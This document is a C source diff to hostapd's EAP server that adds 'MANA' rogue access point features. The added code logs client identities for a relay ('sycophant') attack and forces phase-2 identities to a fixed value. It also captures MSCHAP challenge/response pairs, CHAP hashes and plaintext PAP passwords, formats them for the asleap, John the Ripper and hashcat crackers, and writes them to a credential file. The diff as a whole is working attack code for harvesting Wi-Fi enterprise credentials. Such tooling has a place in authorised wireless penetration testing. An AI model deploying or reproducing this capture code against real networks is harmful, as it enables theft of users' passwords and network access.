@@ -19,6 +19,7 @@
 #include "eap_i.h"
 #include "state_machine.h"
 #include "common/wpa_ctrl.h"
+#include "common/mana.h" //MANA
 
 #define STATE_MACHINE_DATA struct eap_sm
 #define STATE_MACHINE_DEBUG_PREFIX "EAP"
@@ -171,6 +172,46 @@ int eap_user_get(struct eap_sm *sm, const u8 *identity, size_t identity_len,
 	user = os_zalloc(sizeof(*user));
 	if (user == NULL)
 	    return -1;
+
+	//MANA START
+	if (mana.conf->enable_sycophant && os_strcmp("NOT_SET",mana.conf->sycophant_dir) != 0) {
+		char sup_state[2] = "*";
+		FILE* sycophantState;
+		char sycophantStateFile[sizeof(mana.conf->sycophant_dir)+16];
+		os_strlcpy(sycophantStateFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
+		strcat(sycophantStateFile,"SYCOPHANT_STATE");
+		sycophantState = fopen(sycophantStateFile,"rb");
+		if (sycophantState != NULL) {
+			fread(sup_state,1,1,sycophantState);
+			fclose(sycophantState);
+		}
+		if (os_strcmp(sup_state,"I") == 0) {
+			FILE* sycophantID;
+			char sycophantIDFile[sizeof(mana.conf->sycophant_dir)+15];
+			os_strlcpy(sycophantIDFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
+			if (phase2)
+				strcat(sycophantIDFile,"SYCOPHANT_P2ID");
+			else
+				strcat(sycophantIDFile,"SYCOPHANT_P1ID");
+			sycophantID = fopen(sycophantIDFile, "wb");
+
+			if (sycophantID != NULL) {
+				fwrite(identity,identity_len,1,sycophantID);
+				fclose(sycophantID);
+			} else
+				wpa_printf(MSG_ERROR,"SYCOPHANT: Unable to open Sycophant Stage %d Identity File %s",phase2,sycophantIDFile);
+		}
+	}
+	if (mana.conf->mana_wpe || mana.conf->enable_sycophant) {
+		wpa_printf(MSG_INFO, "MANA EAP Identity Phase %d: %.*s", phase2, (int)identity_len, identity);
+		if (phase2) {
+			char ident = 't'; // This must match the entry in the hostapd.eap_user RADIUS config file
+			wpa_printf(MSG_DEBUG, "MANA EAP Identiy Phase %d: Setting identity to %c", phase2, ident);
+			identity = (const u8 *)&ident;
+			identity_len = 1;
+		}
+	}
+	//MANA END
 
 	if (sm->eapol_cb->get_eap_user(sm->eapol_ctx, identity,
 				       identity_len, phase2, user) != 0) {
@@ -2093,6 +2134,7 @@ void eap_server_clear_identity(struct eap_sm *sm)
 }
 
 
+/*
 #ifdef CONFIG_TESTING_OPTIONS
 void eap_server_mschap_rx_callback(struct eap_sm *sm, const char *source,
 				   const u8 *username, size_t username_len,
@@ -2100,7 +2142,7 @@ void eap_server_mschap_rx_callback(struct eap_sm *sm, const char *source,
 {
 	char hex_challenge[30], hex_response[90], user[100];
 
-	/* Print out Challenge and Response in format supported by asleap. */
+	// Print out Challenge and Response in format supported by asleap.
 	if (username)
 		printf_encode(user, sizeof(user), username, username_len);
 	else
@@ -2112,4 +2154,106 @@ void eap_server_mschap_rx_callback(struct eap_sm *sm, const char *source,
 	wpa_printf(MSG_DEBUG, "[%s/user=%s] asleap -C %s -R %s",
 		   source, user, hex_challenge, hex_response);
 }
-#endif /* CONFIG_TESTING_OPTIONS */
+#endif // CONFIG_TESTING_OPTIONS
+*/
+//MANA WPE Start
+void eap_server_mschap_rx_callback(struct eap_sm *sm, const char *source,
+				   const u8 *username, size_t username_len,
+				   const u8 *challenge, const u8 *response)
+{
+	if (mana.conf->mana_wpe) {
+		char hex_sep_challenge[30], hex_sep_response[90], user[100];
+		char hex_challenge[30], hex_response[90];
+
+		/* Print out Challenge and Response in format supported by asleap/jtr/hashcat. */
+		if (username)
+			printf_encode(user, sizeof(user), username, username_len);
+		else
+			user[0] = '\0';
+		wpa_snprintf_hex_sep(hex_sep_challenge, sizeof(hex_sep_challenge),
+				     challenge, sizeof(challenge), ':');
+		wpa_snprintf_hex_sep(hex_sep_response, sizeof(hex_sep_response), response, 24,
+				     ':');
+		wpa_printf(MSG_INFO, "MANA EAP %s ASLEAP user=%s | asleap -C %s -R %s",
+			   source, user, hex_sep_challenge, hex_sep_response);
+		wpa_snprintf_hex(hex_challenge, sizeof(hex_challenge), challenge, sizeof(challenge));
+		wpa_snprintf_hex(hex_response, sizeof(hex_response), response, 24);
+		wpa_printf(MSG_INFO, "MANA EAP %s JTR | %s:$NETNTLM$%s$%s:::::::",
+			   source, user, hex_challenge, hex_response);
+		wpa_printf(MSG_INFO, "MANA EAP %s HASHCAT | %s::::%s:%s",
+			   source, user, hex_response, hex_challenge);
+
+		if (os_strcmp("NOT_SET",mana.conf->mana_credout)!=0) {
+			FILE *f = fopen(mana.conf->mana_credout, "a");
+			if (f != NULL) {
+				fprintf(f,"[%s ASLEAP user=%s]\tasleap -C %s -R %s\n",
+					source, user, hex_sep_challenge, hex_sep_response);
+				fprintf(f,"[%s JTR]\t%s:$NETNTLM$%s$%s:::::::\n",
+					source, user, hex_challenge, hex_response);
+				fprintf(f,"[%s HASHCAT]\t%s::::%s:%s\n",
+					source, user, hex_response, hex_challenge);
+				fclose(f);
+			}
+		}
+	}
+}
+
+void eap_server_chap_rx_callback(struct eap_sm *sm, const char *source,
+				 const u8 *username, size_t username_len,
+				 const u8 *hash, const u8 *salt,
+				 u8 id)
+{
+	if (mana.conf->mana_wpe) {
+		char hex_hash[40], hex_salt[40], hex_id[10], user[100];
+
+		/* Print out Challenge and Response in format supported by asleap/jtr/hashcat. */
+		if (username)
+			printf_encode(user, sizeof(user), username, username_len);
+		else
+			user[0] = '\0';
+		wpa_snprintf_hex(hex_hash, 34, hash, 16);
+		wpa_snprintf_hex(hex_salt, 34, salt, 16);
+		wpa_snprintf_hex(hex_id, 3, &id, 1);
+		wpa_printf(MSG_INFO, "MANA EAP %s JTR user=%s | $chap$%s*%s*%s",
+			   source, user, hex_id, hex_salt, hex_hash);
+		wpa_printf(MSG_INFO, "MANA EAP %s HASHCAT user=%s | %s:%s:%s",
+			   source, user, hex_hash, hex_salt, hex_id);
+
+		if (os_strcmp("NOT_SET",mana.conf->mana_credout)!=0) {
+			FILE *f = fopen(mana.conf->mana_credout, "a");
+			if (f != NULL) {
+				fprintf(f,"[%s JTR user=%s]\t$chap$%s*%s*%s\n",
+					source, user, hex_id, hex_salt, hex_hash);
+				fprintf(f, "[%s HASHCAT user=%s]\t%s:%s:%s\n",
+					source, user, hex_hash, hex_salt, hex_id);
+				fclose(f);
+			}
+		}
+	}
+}
+
+void eap_server_pap_rx_callback(struct eap_sm *sm, const char *source,
+				 const u8 *username, size_t username_len,
+				 const u8 *password, size_t password_len)
+{
+	if (mana.conf->mana_wpe) {
+		char passwd[password_len+1], user[100];
+
+		if (username)
+			printf_encode(user, sizeof(user), username, username_len);
+		else
+			user[0] = '\0';
+		os_memcpy(passwd,password,password_len);
+		wpa_printf(MSG_INFO, "MANA EAP %s | %s:%s",
+			   source, user, password);
+
+		if (os_strcmp("NOT_SET",mana.conf->mana_credout)!=0) {
+			FILE *f = fopen(mana.conf->mana_credout, "a");
+			if (f != NULL) {
+				fprintf(f,"[%s]\t%s:%s\n", source, user, password);
+				fclose(f);
+			}
+		}
+	}
+}
+//MANA WPE END
